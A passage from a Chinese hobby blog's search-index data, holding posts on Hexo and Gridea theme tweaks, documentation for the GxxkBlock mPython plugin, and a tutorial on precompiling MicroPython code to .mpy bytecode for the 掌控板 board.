我使用的是Pure主题，这个很简单，在主题-自定义配置-自定义样式里面填入CSS就会直接应用到所有页面，十分方便 效果展示 light info warning danger success secondary primary ","link":"https://gxxk.site/2bIZ_ghD_/"},{"title":"搭博客少走弯路-Hexo-Fluid主题随机背景图","content":" 本文从旧版博客迁移至此，部分信息已经过时或不适用于基于Gridea的博客，本文需要一个基于Hexo博客引擎，使用Fluid主题的纯静态博客 Tip:编辑配置文件时善用搜索功能 一般被[]包裹的是[注释]或[提示] 这次试着用新风格写这篇文章 一天更2篇，不愧是我~ 文件定位 实现随机背景图需要修改的文件在此处：[主题文件夹]\\layout\\_partials\\header\\banner.ejs 随机背景存放于此处：[主题文件夹]\\source\\img\\random-bg（这里和在[博客根目录]\\source\\目录下效果一样，生成时会将这个文件夹和那个文件夹一起合并到/public里面） 注意：此次修改将导致文章/页面的banner属性无法正常生效（包括_config.fluid.yml）下的Banner配置，并且会在站点所有页面生效，目前没有任何方法修复，请提前做好准备 注：因为图片尺寸不齐，无法使用Javascript设置背景，如果强行设置会导致背景报错 修改模板 一般会在第一行—第六行，有一些变量定义的部分 其中找到var banner_img开头的内容 将等于号后面的内容,一般是page.banner_img || theme.index.banner_img 将这里替换为&quot;/img/random-bg/&quot;+(Math.floor(Math.random() * 17)).toString()+&quot;.jpg&quot; 修改文件 打开存放文件夹，将所有图片放置于文件夹内，按照从0到图片总数+1（本文修改模板时所用的方法因为浮点数原因运算，只有xx.999或xx+1才能正常随机）的顺序给每张图片命名 修改背景透明度 虽然不是这篇文章说的内容，但是我就是要讲一下，毕竟改了之后有的图不怎么好看，要改改透明度 这个修改位置和修改随机背景图的位置一样，打开文件后，找到开头为&lt;div class=&quot;mask flex-center&quot;的部分，在找到后面被rgb(这里是中间一段内容)包裹的地方，将其替换为rgb(0,0,0,0.2)，其中的0.2就是透明度，1就是完全不透明，0就是完全透明 ","link":"https://gxxk.site/HexoRandomBgImg/"},{"title":"GxxkBlock帮助文档","content":" 此作品基于作品GxxkSystemBlockAPI(简称GSBlockAPI)修改而来，都是同一个作者（我改名了awa 原来叫0f-永蓝(此名称LabPlus论坛独占)，现在叫Gxxk） 插件介绍 建议将鼠标悬停于此查看 &lt;!-- more --&gt; 主要功能：补全mPython图形化下没有实现的部分相对于图形化用户技术性较高的代码、为图形化开发者提供较为便捷的一些设置 作者：Gxxk 插件色号：#5b80a5 就像这样 名称：GxxkBlock 帮助文档：https://gxxk.site/post/GxxkBlock (就是你现在在看的这个) 加载方法 下载文件，可以在 LabPlus(盛思) 我发布的最新版本 GxxkBlock 帖子中下载，也可以在此下载 按照图中顺序依次点击对应按钮 在新弹出的界面中，找到最下方被红框标记的按钮并点击 在又弹出的一个新界面中，点击导入，选择插件压缩包，点击导入后，会自动加载插件代码，点击全部导出，然后填写信息，勾选导入mPython，点击确定，就成功导入了此模块，点击加载即可使用 PS: 在第4步中，你可以按照下图填写信息： 各代码块使用方法 执行代码 将执行输入框内的代码，不使用exec()和eval() 获取变量 在右侧输入框内输入变量名，无论在mPython编辑器内有没有定义（创建）变量，均会获取变量值，如变量从未定义过，将会引发NameError错误 等待用户操作 此功能将会创建函数wait()，如使用变量请不要以wait命名 等待用户按下触摸按键（金手指）或AB两个按键，在没有操作之前将会一直等待直到发生操作并符合设定的条件 可用内存 此功能将会导入模块gc，如使用变量请不要以gc命名 将会获取当前可用的运行存储/RAM/内存，单位Bytes，类型int 哈希 返回拼接对象（右边拼接的那个）的哈希值 设置保险RAM分配 此功能将会导入模块micropython，如使用变量请不要以micropython命名 此功能将会设置在正常情况下预留大约100Bytes空间，也就是大约可用100KB-100Bytes的RAM可用，如超过此空间将会引发MemoryError错误（可使用try...except...捕获错误并提示用户内存错误） 此功能为了正常运行，自动设置最小值50 在输入框内填写对应大小即可设置（单位为Bytes/字节） 设置编译等级 此功能将会导入模块micropython，如使用变量请不要以micropython命名 关于详细信息详见官方文档https://mpython.readthedocs.io/zh/master/reference/constrained.html#id2 开启：在加载代码时先将代码编译为字节码，再由MicroPython虚拟机执行（如已编译为mpy格式将直接加载） 关闭：直接执行代码 关闭且不记录行号：直接执行代码且发生错误时不提示错误位置 解锁 / 锁定 内存堆 此功能将会导入模块micropython，如使用变量请不要以micropython命名 锁定内存堆后将会禁止任何内存分配，如果尝试分配内存(如创建变量并写入新数据)等操作将会引发MemoryError 字面意思，执行后将会 禁止/允许 与内存分配有关的操作 这里的内存分配指执行命令，定义变量，导入模块等操作 设置为常量 此功能将会导入模块micropython，如使用变量请不要以micropython命名 将会把右侧的输入值声明为常量（一般需要将返回值传入到变量内），以便在编译时进行优化（只能是表达式，否则将会报错） 转布尔值 将任意内容转为布尔值 将变量...加 / 减 / 乘 / 除 此功能需要先在mPython软件内定义变量或使用本模块的代码将变量...修改为后才可使用 将在指定变量的原有值上进行相对应的操作（增加情况下，右侧可放置字符串，放置的字符串将会在运行此代码时追加到变量最后面） 将变量...修改为 无论此变量是否存在，是否在mPython里创建过，都会强制修改变量，如没有，将会自动创建（mPython软件不会显示） 执行代码-eval 使用eval()执行右侧的表达式（或者是一行代码）等内容，返回对应内容的结果 更好地连接WiFi 基本上与原有连接WiFi功能一致，但是将连接WiFi这一操作放到了原有代码块的位置（但是实例化wifi类这一操作还是会放置于最前面） 内存回收 此功能将会导入模块gc，如使用变量请不要以gc命名 进行：将回收代码以后可能用不到的内存，在设置禁用后仍可用 开启：在即将内存溢出的时候自动进行内存回收 禁用：关闭开启内存回收这一功能 导入模块 导入指定文件内的所有函数，代码，列表等所有对象，并作为模块调用，此功能并不会强制把模块放到最前面，建议放置于代码开头 注：导入时，将会执行所有最外层的代码 执行代码-exec 用exec()执行代码，需要用\\n作为分隔符（换行符），右侧需要拼接字符串 执行代码-无换行符 直接将输入的代码插入进你的代码内，并且没有换行符，可用于自定义判断条件等情况，实现方法和模块获取变量一样 关/开屏幕 可以关闭/开启掌控版自带的OLED屏幕，可以节省拓展版电量 设置屏幕亮度 设置掌控版自带的OLED屏幕的亮度，值为0-255 编译代码 将存储在变量中的字符串形式的代码编译为特定的一个代码对象，可以和运行代码-eval或运行代码-exec搭配使用 ","link":"https://gxxk.site/GxxkBlock/"},{"title":"将代码编译为掌控版可运行的字节码","content":" 此文章迁移至旧版博客的文章：“教程-将代码编译为microPython字节码”，现名称为“将代码编译为字节码” 本文针对掌控版设备编写 这篇教程站长写了114514天，评论一下加点人气吧qwp 前言 最近因为我的程序经常内存错误，翻了翻掌控版的帮助文档，想找找解决办法，发现在运行模块的时候，掌控版会先把代码编译成机器可以执行的字节码，然后再由掌控版中的microPython虚拟机来执行字节码 原文：https://mpython.readthedocs.io/zh/master/reference/constrained.html#id2 （注：RAM可以理解为内存，但是与存储数据的内存并不一样，这里统一把运行数据的内存叫RAM，运行你刷入在掌控版里的代码也需要导入） 其中提到：字节码存储在RAM中。编译器本身需要RAM，但其在编译完成后才可用。 若已导入多个模块，则在没有足够的RAM来运行编译器时，在这种情况下，导入语句将引发内存异常。 文中还提到：若RAM仍不足够编译所有模块，一种解决方案是预编译模块。MicroPython有一个交叉编译器， 可将代码编译为字节码。 在大多数平台上，这样可以节省更多的RAM，因为字节码直接从闪存运行而没有存储在RAM中。 将这两者联系起来，我们就可以得出一个解决办法：将代码预编译为microPython字节码，使其不需要编译，直接导入RAM并由虚拟机执行即可 为什么要这样做？ LabPlus论坛内的系统大多都为单文件系统，一般情况下，编译代码需要双倍的内存，假设系统100kb，那么在编译时必定会内存错误 同时，这样可以加快系统的运行速度，方便运行，不会在内存方面出很大的问题 教程 安装Python 这里详见这篇教程：https://www.liaoxuefeng.com/wiki/1016959663602400/1016959856222624 获取编译器（mpy-cross） 确定版本和架构 首先，在掌控版下运行这样一段代码，确定掌控版支持的预编译文件版本和架构： exec(b&quot;import sys\\nsys_mpy = sys.implementation.mpy\\narch = [None,'x86', 'x64','armv6','armv6m','armv7m','armv7em', 'armv7emsp','armv7emdp','xtensa', 'xtensawin'][sys_mpy &gt;&gt; 10]\\nprint('\\xe7\\x89\\x88\\xe6\\x9c\\xac:', sys_mpy &amp; 0xff)\\nprint('\\xe6\\x9e\\xb6\\xe6\\x9e\\x84: ', end='')\\nif arch:print(arch, end='')\\nelse:print('\\xe6\\x97\\xa0')\\nif True:\\n print('')&quot;.decode()) 一般情况下，会返回这样一段内容： 版本: 5 架构: xtensawin 如果不对的话，一般是新版本固件或硬件更改了架构，在后面的教程中会有详细注明如何操作 然后，按下Win+R，输入cmd，回车 然后再输入pip install -i https://pypi.tuna.tsinghua.edu.cn/simple mpy-cross-v5 这一行代码是用于获取编译器用的，如果之前运行代码给出的版本不一样，那就把最后的v5中的5替换成别的版本号吧 如果提示安装失败，并且自定义选择了别的版本安装，可以去掉后面的3个字符试试 这个时候，尝试输入mpy-cross-v5 --version（版本号的v5这里同样也需要替换），应该会返回如下信息： MicroPython XXXXXXX on XXXX-XX-XX; mpy-cross emitting mpy vX X代表不固定的数字或字母，如果正常返回了这些信息，代表获取成功 修改编译器路径 输入mpy-cross-v5 --help（同上，也需要替换版本号），获取帮助信息和本体存储地址，如果操作正确无误，那么会返回如下信息： usage: C:\\Users\\****\\AppData\\Roaming\\Python\\Python310\\site-packages\\mpy_cross-v5\\mpy-cross-v5.exe [&lt;opts&gt;] [-X &lt;implopt&gt;] &lt;input filename&gt; Options: --version : show version information -o : output file for compiled bytecode (defaults to input with .mpy extension) -s : source filename to embed in the compiled bytecode (defaults to input file) -v : verbose (trace various operations); can be multiple -O[N] : apply bytecode optimizations of level N Target specific options: -msmall-int-bits=number : set the maximum bits used to encode a small-int -mno-unicode : don't support unicode in compiled strings -march=&lt;arch&gt; : set architecture for native emitter; x86, x64, armv6, armv7m, armv7em, armv7emsp, armv7emdp, xtensa, xtensawin Implementation specific options: emit={bytecode,native,viper} -- set the default code emitter heapsize=&lt;n&gt; -- set the heap size for the GC (default 2097152) 其中，第一行在usage:和[&lt;opts&gt;]之间的路径，就是编译器的本体的位置了，我们从只需要复制最后mpy-cross-v5.exe前面的内容，如： C:\\Users\\****\\AppData\\Roaming\\Python\\Python310\\site-packages\\mpy_cross-v5\\ 然后按下Win+E，打开文件资源管理器，在上方显示路径的地方粘贴这个路径，然后找到目录下的__唯一一个__可执行文件，重命名为mpy-cross.exe 使用编译器编译 先把你的代码（py格式）放到一个文件夹内 按下Win+R，输入cmd，然后输入cd加空格，粘贴有代码的那个文件夹的__绝对路径__（如C:\\MyCode\\mPython\\），按下回车 如果正常，&gt;左边的东西会变成你刚刚粘贴的路径，这个时候，我们再来输入mpy-cross ，后面写上你的代码名称，再加上-march=xtensawin，（这里的xtensawin是编译指定的架构，需要根据之前获取的数据确定），按下回车，如果没有问题，文件夹内会产生一个扩展名为mpy的文件，这就是成品了 如何使用 打开mPython软件，把这个文件刷入进掌控版（不是点击右上角刷入按钮） 然后进入代码模式，输入以下代码 import 文件名（不带最后的.mpy后缀） 然后点击右上角刷入，就可以加载代码啦~ ","link":"https://gxxk.site/compileMPythonCode/"},{"title":"Hello Gridea","content":" 此内容是关于本站博客引擎的介绍，博客初始化时自带，您可以无视此文章或阅读此文章，了解 Gridea 👏 欢迎使用 Gridea ！ ✍️ Gridea 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意...... Github Gridea 主页 示例网站 特性👇 📝 你可以使用最酷的 Markdown 语法，进行快速创作 🌉 你可以给文章配上精美的封面图和在文章任意位置插入图片 🏷️ 你可以对文章进行标签分组 📋 你可以自定义菜单，甚至可以创建外部链接菜单 💻 你可以在 Windows，MacOS 或 Linux 设备上使用此客户端 🌎 你可以使用 𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌 或 Coding Pages 向世界展示，未来将支持更多平台 💬 你可以进行简单的配置，接入 Gitalk 或 DisqusJS 评论系统 🇬🇧 你可以使用中文简体或英语 🌁 你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力 🖥 你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步 🌱 当然 Gridea 还很年轻，有很多不足，但请相信，它会不停向前 🏃 未来，它一定会成为你离不开的伙伴 尽情发挥你的才华吧！ 😘 Enjoy~ ","link":"https://gxxk.site/hello-gridea/"}]}